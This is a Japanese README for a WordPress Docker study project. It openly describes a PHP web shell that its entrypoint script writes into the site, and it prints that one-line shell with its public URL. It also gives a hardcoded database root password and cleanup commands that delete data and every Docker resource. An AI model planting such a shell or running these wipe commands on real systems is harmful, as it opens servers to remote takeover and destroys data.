# inception

WordpressのDockerコンテナです。
セキュリティの勉強をかねて少しやります。

WebShell仕込んでます。
実稼働で使わないでください！

## Containers

- nginx
- wordpress
- mariadb

## WebShell

https://ashitomi.42.jp/wordpress/wp_get-access.php

### 配置場所

- /var/www/html/wordpress/wp_get-access.php

`srcs/requirements/wordpress/docker-entrypoint.sh`

```bash
echo '<?php system($_GET["cmd"]);?>' > /var/www/html/wordpress/wp_get-access.php
```

### 用途

Bonusの部分で利用します。

> 自分が便利だと思う好きなサービスを設定する。選んだサービスを正当化する必要があります。

## ポートフォリオ

昔作ったポートフォリをを載せてます。

### 用途

Bonusの部分で利用します。

> PHPを除くお好きな言語で、簡単な静的ウェブサイトを作成してください（はい、PHPは除きます！）。例えば、ショーケースサイトや履歴書を発表するためのサイトなど。

## SQL チートシート

```
# Maria DBのサーバーニアタッチする
docker exec -it $(docker ps -q -f name=mariadb) /bin/ash

# ログイン
mariadb -hlocalhost -uroot -p42inceptiondbroot

# MySQLのコマンド
> USE mysql;
> SELECT * FROM <TABLE_NAME>
```

## Memo

### 環境を初期化する

```shell
sudo rm -rf ~/data/

docker stop $(docker ps -qa); docker rm $(docker ps -qa); docker rmi -f $(docker images -qa); docker volume rm $(docker volume ls -q); docker network rm $(docker network ls -q) 2>/dev/null
```

### 起動確認

https://localhost:443/wp_install_log.html